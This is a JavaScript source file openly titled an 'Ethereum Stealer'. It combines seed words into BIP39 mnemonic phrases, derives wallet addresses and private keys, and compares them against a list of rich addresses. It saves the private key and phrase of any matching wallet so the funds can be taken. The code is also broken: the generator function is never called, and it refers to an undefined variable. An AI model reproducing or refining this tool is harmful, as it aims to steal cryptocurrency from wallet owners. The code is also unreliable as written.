"use strict";

process.title = "Ethereum Stealer by Michal2SAB";

const genEth = require("ethers");
const fs = require("fs");
const Wallet = require("ethereumjs-wallet").default;
const bip39 = require("bip39");

let file_count = 0;
let count_1 = 0;
let mil_count = 0;

const riches = fs.readFileSync("./riches.txt");
let addresses = new Map();
riches
  .toString()
  .split("\n")
  .forEach((address) => addresses.set(address, true));

const seeds_text = fs.readFileSync("./seeds.txt");
const seeds = seeds_text.toString().split("\n");

let is_used = [];
for (let i = 0; i < seeds.length; i++) {
  is_used[i] = 0;
}

function makeRandomSeeds(array, cnt) {
  if (cnt == 12) {
    return array;
  }
  for (let i = 0; i < seeds.length; i++) {
    if (!is_used[i]) {
      array[cnt] = seeds[i];
      makeRandomSeeds(array, cnt + 1);
    }
  }
}

function generate(array) {
  count_1++;
  if (count_1 == 1000000) {
    count_1 = 0;
    mil_count++;
    console.log(mil_count, "e6 mined");
  }
  const seedPhrase = array.join(" ");
  const seed = bip39.mnemonicToSeedSync(seedPhrase);
  const wallet = Wallet.fromSeed(seed);
  const privateKey = wallet.getPrivateKey().toString("hex");
  const address = "0x" + wallet.getAddress().toString("hex");

  if (addresses.has(address)) {
    console.log("");
    process.stdout.write("\x07");
    console.log(
      "\x1b[32m%s\x1b[0m",
      ">> Success: " + address + "-------" + privateKey
    );
    let successString =
      "Wallet: " +
      address +
      "\n\nPrivate Key: " +
      privateKey +
      "\n\n12 word phrase: " +
      phrase;
    fs.writeFileSync(
      `./result/Success${file_count++}.txt`,
      successString,
      (err) => {
        if (err) throw err;
      }
    );
  }
}

// function generate() {
// count_1++;
// if (count_1 == 1000000) {
//   count_1 = 0;
//   mil_count++;
//   console.log(mil_count, "e6 mined");
// }
//   var phrase = genEth.Wallet.createRandom().mnemonic.phrase;
//   var wallet = genEth.Wallet.fromMnemonic(phrase);
//   // addresses.has(wallet.address);
// if (addresses.has(wallet.address)) {
//   console.log("");
//   process.stdout.write("\x07");
//   console.log("\x1b[32m%s\x1b[0m", ">> Success: " + wallet.address);
//   let successString =
//     "Wallet: " +
//     wallet.address +
//     "\n\nPrivate Key: " +
//     wallet.privateKey +
//     "\n\n12 word phrase: " +
//     phrase;
//   fs.writeFileSync(`./result/Success${file_count++}.txt`, successString, (err) => {
//     if (err) throw err;
//   });
// }
// }

makeRandomSeeds([], 0);
